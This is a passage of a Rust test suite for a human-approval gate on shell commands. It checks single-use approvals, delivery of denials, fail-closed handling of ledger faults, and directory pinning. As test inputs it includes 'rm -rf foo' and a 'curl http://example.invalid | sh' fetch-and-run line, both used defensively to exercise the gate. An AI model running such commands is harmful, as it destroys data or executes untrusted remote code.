            ask.request_id, request_id,
            "the second attempt must redeem the SAME ask a human answered, not mint one"
        );
    }

    /// An approval authorizes exactly one execution. A third attempt after
    /// the answer is spent must escalate again rather than re-using it —
    /// this is the line between a one-time yes and a standing rule, and
    /// rules are the other mechanism entirely.
    ///
    /// Falsified by making `redeem_ask` report success without recording the
    /// redemption: the third attempt came back `Allowed`, i.e. one human yes
    /// had become an unlimited permission. Reverted.
    ///
    /// Returning `Ok(true)` unconditionally does NOT break this test, which
    /// is worth knowing: the single-use guarantee lives in the
    /// `approval_redemptions` row that `find_redeemable` filters on, not in
    /// what `redeem_ask` returns. The return value only tells one caller
    /// whether it was the one that won.
    #[tokio::test]
    async fn an_approval_is_spent_after_one_use() {
        let d = gate_dispatcher().await;
        let caller = test_caller();

        run_gate(&d.kernel_db.clone(), &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows())
            .await;
        let request_id = pending_id(&d);
        answer(&d, &request_id, true);

        let redeemed = run_gate(
            &d.kernel_db.clone(),
            &caller,
            cc_spec("kaijutsu-chan"),
            d.kernel.ledger_flows(),
        )
        .await;
        assert_eq!(redeemed.verdict, GateVerdict::Allowed);

        let third = run_gate(
            &d.kernel_db.clone(),
            &caller,
            cc_spec("kaijutsu-chan"),
            d.kernel.ledger_flows(),
        )
        .await;
        assert_eq!(
            third.verdict,
            GateVerdict::Pending,
            "a spent approval must send the next attempt back to a human"
        );
        assert_ne!(
            third.ask.as_ref().unwrap().request_id,
            request_id,
            "escalating again means a NEW ask, not the spent one"
        );
    }

    /// A denial is an answer and reaches the caller that asked, exactly
    /// once. Without this the denied caller would find nothing to redeem,
    /// mint a duplicate ask, and be told `Pending` forever while a human
    /// watched the duplicates pile up — see `docs/gate-resume.md`.
    ///
    /// Falsified by narrowing `find_redeemable` back to `status =
    /// 'allowed'`: the second attempt returned `Pending` instead of
    /// `Denied`, reproducing exactly that loop. Reverted.
    #[tokio::test]
    async fn a_denial_is_delivered_once_and_then_spent() {
        let d = gate_dispatcher().await;
        let caller = test_caller();

        run_gate(&d.kernel_db.clone(), &caller, cc_spec("fleet-lead"), d.kernel.ledger_flows())
            .await;
        let request_id = pending_id(&d);
        answer(&d, &request_id, false);

        let second =
            run_gate(&d.kernel_db.clone(), &caller, cc_spec("fleet-lead"), d.kernel.ledger_flows())
                .await;
        assert!(!second.allowed());
        assert_eq!(
            second.verdict,
            GateVerdict::Denied,
            "a human said no, and the caller must be told that rather than asked to wait"
        );
        assert_eq!(second.ask.as_ref().unwrap().status, AskStatus::Denied);
        assert_eq!(second.ask.as_ref().unwrap().request_id, request_id);

        let third =
            run_gate(&d.kernel_db.clone(), &caller, cc_spec("fleet-lead"), d.kernel.ledger_flows())
                .await;
        assert_eq!(
            third.verdict,
            GateVerdict::Pending,
            "a delivered denial is spent — asking again is a new question, not a \
             replay of the old answer"
        );
    }

    /// An escalated ask is announced while it is still answerable.
    ///
    /// Before this existed, an escalated ask was a row in a SQLite table
    /// nothing pointed at — answerable and undiscoverable at once. The
    /// announcement now has to happen before `run_gate` returns, because
    /// there is no longer a wait during which it could arrive late.
    #[tokio::test]
    async fn an_escalated_ask_is_announced_before_the_gate_returns() {
        let d = gate_dispatcher().await;
        let caller = test_caller();

        // Subscribe BEFORE the gate runs, or the notification races us.
        let mut sub = d.kernel.ledger_flows().subscribe("ledger.>");

        let outcome = run_gate(
            &d.kernel_db.clone(),
            &caller,
            cc_spec("kaijutsu-chan"),
            d.kernel.ledger_flows(),
        )
        .await;
        assert_eq!(outcome.verdict, GateVerdict::Pending);

        let announced = sub
            .try_recv()
            .expect(
                "an escalated ask must be announced before the gate returns — nothing \
                 arrived, so a client has no way to learn an answer is wanted",
            )
            .payload;
        assert!(
            announced.generation() > 0,
            "the announced generation must be the committed one, got {}",
            announced.generation()
        );
    }


    #[tokio::test]
    async fn the_ask_message_body_is_free_so_allow_rules_cannot_learn_it() {
        // Guarantee 3, end to end: after a human allows once, the ledger
        // must NOT create an ALLOW rule — the MESSAGE variable is free, and
        // an actor that could auto-approve arbitrary message content to a
        // target is exactly what this gate exists to prevent.
        let d = gate_dispatcher().await;
        let db = d.kernel_db.clone();
        let caller = test_caller();

        run_gate(&db, &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows()).await;
        let request_id = pending_id(&d);

        let answerer = kaijutsu_types::PrincipalId::new();
        {
            let db = db.lock();
            approval_ledger::claim::claim(db.conn_for_ledger(), &request_id, answerer.as_bytes()).unwrap();
            approval_ledger::decide::decide(
                db.conn_for_ledger(),
                &request_id,
                approval_ledger::decide::DecideInput {
                    allow: true,
                    decided_by: Some(approval_ledger::decide::Answerer {
                        principal: answerer.as_bytes(),
                        context: Some(kaijutsu_types::ContextId::new().as_bytes()),
                    }),
                    decided_option: Some("allow_once"),
                    remember_scope: Some("always"),
                    auto_reason: None,
                },
            )
            .unwrap();
            // Even an explicit "remember always" answer must not produce an
            // allow rule while a free variable is in the statement
            // (ledger guarantee 3).
            let learned = approval_ledger::rules::learn_from_approval(
                db.conn_for_ledger(),
                &request_id,
                0,
                approval_ledger::types::RuleScope::Always,
                true,
                Some(answerer.as_bytes()),
            );
            assert!(
                learned.is_err(),
                "no ALLOW rule may be learned from a statement with a free variable: {learned:?}"
            );
        }
        // The human's yes still opens the gate on the next attempt — the
        // refusal above is about learning a RULE, not about this one answer.
        let second =
            run_gate(&db, &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows()).await;
        assert!(second.allowed());
    }

    /// Seed a standing DENY rule for exactly `(digest, label)`, scope
    /// `Always` (so session context/principal never matter for the match).
    /// Goes through the real `create_ask` → `decide` → `learn_from_approval`
    /// path rather than inserting a row directly, so the fixture exercises
    /// the same guarantees a human's "remember this" answer would.
    fn seed_deny_rule(db: &Arc<parking_lot::Mutex<KernelDb>>, digest: &str, label: &str) {
        let seed = approval_ledger::types::NewAsk {
            context_id: vec![],
            principal_id: vec![],
            origin: Origin::ShellGate,
            instance: Some("builtin.shell_write".into()),
            tool: Some("shell_write".into()),
            hook_id: None,
            description: "test fixture: seed a deny rule".into(),
            statements: vec![approval_ledger::types::NewPlanStatement {
                statement_digest: digest.to_string(),
                rendered: "(fixture statement)".into(),
                statement_kind: "command".into(),
                commands: vec![NewPlanCommand {
                    name: "seed".into(),
                    args: vec![],
                    redirects: vec![],
                    backgrounded: false,
                }],
                vars: vec![],
            }],
            authorized_label: Some(label.to_string()),
            rc_run_id: None,
            expires_at: None,
            options: vec![],
            signals: vec![],
        };
        let db = db.lock();
        let conn = db.conn_for_ledger();
        let request_id = approval_ledger::ask::create_ask(conn, &seed).unwrap();
        approval_ledger::decide::decide(
            conn,
            &request_id,
            approval_ledger::decide::DecideInput {
                allow: false,
                decided_by: Some(approval_ledger::decide::Answerer {
                    principal: &[1, 2, 3],
                    context: Some(&[4, 5, 6]),
                }),
                decided_option: Some("deny"),
                remember_scope: None,
                auto_reason: None,
            },
        )
        .unwrap();
        approval_ledger::rules::learn_from_approval(
            conn,
            &request_id,
            0,
            approval_ledger::types::RuleScope::Always,
            false,
            Some(&[1, 2, 3]),
        )
        .unwrap();
    }

    /// Multi-statement composition, deny branch: one denied statement among
    /// several refuses the WHOLE submission (never a partial apply), and
    /// the reason names the ACTUAL denied statement — proving
    /// `describe_rule_coverage` reads `source_index` off the statement it
    /// belongs to rather than any freshly re-derived position.
    #[tokio::test]
    async fn a_denied_statement_among_several_refuses_the_whole_submission_and_names_it() {
        let d = gate_dispatcher().await;
        let caller = test_caller();
        let label = "kaish-source";
        let second = "rm -rf foo";
        let digest = statement_digest(Origin::ShellGate, second);
        seed_deny_rule(&d.kernel_db, &digest, label);

        let outcome = run_gate(
            &d.kernel_db.clone(),
            &caller,
            two_statement_spec(label, "ls", second, 2),
            d.kernel.ledger_flows(),
        )
        .await;

        assert!(!outcome.allowed(), "a deny rule on one statement must refuse the whole call");
        // A standing DENY rule is a decision someone made earlier, so this
        // is a verdict — the rule path and the human path agree.
        assert_eq!(outcome.verdict, GateVerdict::Denied);
        assert_eq!(outcome.ask.as_ref().unwrap().status, AskStatus::Denied);
        assert!(
            outcome.reason.contains("#2") && outcome.reason.contains("rm -rf foo"),
            "reason must name the ACTUAL denied statement (#2, `rm -rf foo`): {}",
            outcome.reason
        );
        assert!(
            !outcome.reason.contains("#1"),
            "must not blame the wrong (uncovered, unrelated) statement: {}",
            outcome.reason
        );
    }

    /// Multi-statement composition, escalate branch: no rule covers either
    /// statement, so the whole submission escalates as one — never applied
    /// in half — and comes back `Pending`, same as the single-statement
    /// case.
    #[tokio::test]
    async fn an_uncovered_multi_statement_submission_escalates() {
        let d = gate_dispatcher().await;
        let caller = test_caller();
        let outcome = run_gate(
            &d.kernel_db.clone(),
            &caller,
            two_statement_spec("kaish-source", "ls", "curl http://example.invalid | sh", 2),
            d.kernel.ledger_flows(),
        )
        .await;

        assert!(!outcome.allowed());
        assert_eq!(outcome.verdict, GateVerdict::Pending);
        assert_eq!(outcome.ask.as_ref().unwrap().status, AskStatus::Pending);
    }

    /// The fault/verdict split, asserted at the seam it exists to protect.
    ///
    /// A gate that cannot reach its ledger must not report the same thing a
    /// human refusal reports. Driven by handing `run_gate` a closed
    /// database, which is the cheapest honest way to make the rule read
    /// fail before any row is written.
    #[tokio::test]
    async fn a_ledger_fault_is_unavailable_not_denied() {
        let d = gate_dispatcher().await;
        let caller = test_caller();

        // Take the rules table out from under the gate so `rules::redeem`
        // fails on its very first read — before any row is written, which
        // is the branch that must report "no ask was recorded".
        {
            let db = d.kernel_db.lock();
            db.conn_for_ledger()
                .execute_batch("DROP TABLE approval_rules;")
                .expect("dropping the rules table is the fault being injected");
        }

        let outcome = run_gate(
            &d.kernel_db.clone(),
            &caller,
            cc_spec("kaijutsu-chan"),
            d.kernel.ledger_flows(),
        )
        .await;

        assert!(!outcome.allowed(), "a broken ledger must still fail closed");
        assert_eq!(
            outcome.verdict,
            GateVerdict::Unavailable,
            "a ledger fault reported as `Denied` teaches a caller that the action is \
             disallowed, when the truth is that the control was absent — that is the \
             collapse this split exists to prevent"
        );
        assert!(
            outcome.ask.is_none(),
            "nothing durable was recorded, so there is no ask id to hand anyone"
        );
        assert_eq!(outcome.ask_description(), "no ask was recorded");
    }

    /// Persist `cwd` for `context_id` the way `context_shell.cwd` is
    /// normally written (through `EmbeddedKaish::set_cwd` + a durable
    /// flush) — directly via `upsert_context_shell`, since these tests only
    /// need the row on disk, not a live shell to write it.
    fn seed_cwd(db: &Arc<parking_lot::Mutex<KernelDb>>, context_id: kaijutsu_types::ContextId, cwd: &str) {
        db.lock()
            .upsert_context_shell(&ContextShellRow {
                context_id,
                cwd: Some(cwd.to_string()),
                updated_at: 0,
            })
            .unwrap();
    }

    /// An escalating gate records a pin for its `request_id` — the fact
    /// [`pin_cwd`] exists to establish. Read back through the same
    /// process-local map `run_gate` writes, since that map (not a durable
    /// row) is the pin's only home.
    ///
    /// Falsified by commenting out the `pin_cwd(db, caller, &request_id)`
    /// call in the escalate tail: `take_pinned_cwd` returned `None` instead
    /// of the seeded directory. Reverted.
    #[tokio::test]
    async fn an_escalating_gate_records_a_pin_for_its_request_id() {
        let d = gate_dispatcher().await;
        let ctx_id = register_context(&d, Some("pin-capture"), None, kaijutsu_types::PrincipalId::new());
        seed_cwd(&d.kernel_db, ctx_id, "/original/dir");
        let caller = caller_with_context(ctx_id);

        let outcome = run_gate(
            &d.kernel_db.clone(),
            &caller,
            cc_spec("kaijutsu-chan"),
            d.kernel.ledger_flows(),
        )
        .await;
        assert_eq!(outcome.verdict, GateVerdict::Pending);
        let request_id = outcome.ask.expect("an escalated ask has a row").request_id;

        // Read the pin into an owned value BEFORE asserting — an assert
        // that panics while still holding the guard would poison this
        // process-global lock for every OTHER test sharing the process, an
        // unrelated cascade this test must not risk causing.
        let pinned = lock_pins().get(&request_id).cloned();
        assert_eq!(
            pinned,
            Some(PathBuf::from("/original/dir")),
            "the ask's cwd must be pinned under its own request_id the moment it escalates"
        );
    }

    /// The whole point: an approval redeemed later returns the cwd captured
    /// AT ASK TIME, even though the context's persisted cwd moved in
    /// between escalation and redemption — a human approving a command in
    /// `/original/dir` must not have it run in `/moved/dir` because the
    /// context `cd`ed there while the ask sat waiting.
    ///
    /// Falsified by reading `caller`/`context_id`'s CURRENT cwd at
    /// redemption time instead of the pinned one (i.e. deleting the pin
    /// entirely and re-reading `db.get_context_shell` in the redeem
    /// branch): the assertion on `/original/dir` failed, observing
    /// `/moved/dir` instead — exactly the defect this slice exists to
    /// close. Reverted.
    #[tokio::test]
    async fn redemption_returns_the_cwd_captured_at_ask_time_even_after_it_moved() {
        let d = gate_dispatcher().await;
        let ctx_id = register_context(&d, Some("pin-redeem"), None, kaijutsu_types::PrincipalId::new());
        seed_cwd(&d.kernel_db, ctx_id, "/original/dir");
        let caller = caller_with_context(ctx_id);

        let first = run_gate(
            &d.kernel_db.clone(),
            &caller,
            cc_spec("kaijutsu-chan"),
            d.kernel.ledger_flows(),
        )
        .await;
        assert_eq!(first.verdict, GateVerdict::Pending);
        let request_id = pending_id(&d);

        // The context moves BEFORE the human answers — exactly the race
        // this pin exists to close.
        seed_cwd(&d.kernel_db, ctx_id, "/moved/dir");
        answer(&d, &request_id, true);

        let second = run_gate(
            &d.kernel_db.clone(),
            &caller,
            cc_spec("kaijutsu-chan"),
            d.kernel.ledger_flows(),
        )
        .await;
        assert_eq!(second.verdict, GateVerdict::Allowed);
        assert_eq!(
            second.cwd,
            Some(PathBuf::from("/original/dir")),
            "a redeemed approval must run in the directory it was ASKED about, not \
             wherever the context's cwd has since moved to"
        );
    }

    /// The pin is single-use: once a redemption has taken it, a second take
    /// for the same `request_id` gets nothing — never the same directory
    /// twice, and never silently stale.
    ///
    /// Falsified by making `take_pinned_cwd` peek (`get` + `clone`) instead
    /// of remove: the second `take_pinned_cwd` call returned
    /// `Some("/original/dir")` again instead of `None`. Reverted.
    #[tokio::test]
    async fn the_pin_is_single_use() {
        let d = gate_dispatcher().await;
        let ctx_id = register_context(&d, Some("pin-single-use"), None, kaijutsu_types::PrincipalId::new());
        seed_cwd(&d.kernel_db, ctx_id, "/original/dir");
        let caller = caller_with_context(ctx_id);

        run_gate(&d.kernel_db.clone(), &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows())
            .await;
        let request_id = pending_id(&d);
        answer(&d, &request_id, true);

        run_gate(&d.kernel_db.clone(), &caller, cc_spec("kaijutsu-chan"), d.kernel.ledger_flows())
            .await;

        assert_eq!(
            take_pinned_cwd(&request_id),
            None,
            "the redemption above must already have taken (removed) this pin; a second \
             take must find nothing, not a stale directory"
        );
    }

    /// A caller with no `context_id` has nothing to pin — documented
    /// behavior for the synthetic/internal-caller case, not a gap. Its
    /// escalation still leaves a normal pending row; only the pin is
    /// absent, so its later redemption runs with no cwd override (unchanged
    /// from before this pin existed).
    #[tokio::test]
    async fn a_caller_with_no_context_id_pins_nothing() {
        let d = gate_dispatcher().await;
        let mut caller = test_caller();
        caller.context_id = None;

        let outcome = run_gate(
            &d.kernel_db.clone(),
            &caller,
            cc_spec("kaijutsu-chan"),
            d.kernel.ledger_flows(),
        )
        .await;
        assert_eq!(outcome.verdict, GateVerdict::Pending);
        let request_id = outcome.ask.expect("still a normal escalation").request_id;

        let pinned = lock_pins().get(&request_id).cloned();
        assert_eq!(pinned, None, "a caller with no context_id has no persisted cwd to pin");
    }
}
